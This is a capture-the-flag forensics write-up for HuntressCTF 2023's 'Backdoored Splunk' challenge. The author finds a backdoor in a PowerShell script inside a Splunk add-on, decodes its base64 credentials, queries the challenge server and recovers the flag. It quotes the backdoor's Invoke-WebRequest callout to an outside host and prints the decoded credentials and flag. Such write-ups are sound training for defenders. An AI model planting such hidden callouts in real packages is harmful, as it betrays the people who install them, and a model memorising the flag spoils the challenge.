---
title: 2023 HuntressCTF - Backdoored Splunk
date: 2023-10-06T15:04:11-06:00
tags:
  - forensics
image: /2023-HuntressCTF/bs.png
---

### Summary
```
Author: Adam Rice  
  
You've probably seen Splunk being used for good, but have you seen it used for evil?  
  
**NOTE: the focus of this challenge should be on the downloadable file below. It uses the dynamic service that is started, but you must put the puzzle pieces together to be retrieve the flag. The connection error to the container is part of the challenge.**  
  
**Download the file(s) below and press the `Start` button on the top-right to begin this challenge.**
```

### Steps

I started the container for the challenge and downloaded ```Splunk_TA_windows.zip``` and unzipped the files in kali.  

![](//2023-HuntressCTF/bsfiles.png)


I decided to start in the bin folder and started to enumerate the various python and PowerShell files. After a few minutes I discovered ```nt6-health.ps1``` in the ```/bin/powershell/``` folder.   Near the middle of the PowerShell script there was an ```Invoke-Webrequest``` command connecting out to ```http://chal.ctf.games:$PORT``` using an authorization header that is base64 encoded. 
```powershell
$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
```

Decoding the base64 string I discovered the username and password of ```backdoor:use_this_to_authenticate_with_the_deployed_http_server``` so I knew I was on the right track.   

Next started a pwsh session and setup the PowerShell request using the provided  information. Note: the domain and port were provided when starting the container at the start of the challenge. 

```powershell
$headers = @{Authorization="Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg=="}
$uri = "http://chal.ctf.games:32367" 
$response = Invoke-WebRequest -uri $uri -Headers $headers
```

After sending the above PowerShell commands, I executed ```$response``` and found the content was base64 encoded. 

![](/2023-HuntressCTF/bsresponse.png)

Continuing to use PowerShell, I base64 decoded the string and discovered the flag!
```powershell
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ=='))
echo flag{60bb3bfaf703e0fa36730ab70e115bd7}
```

![](/2023-HuntressCTF/bsflag.png)
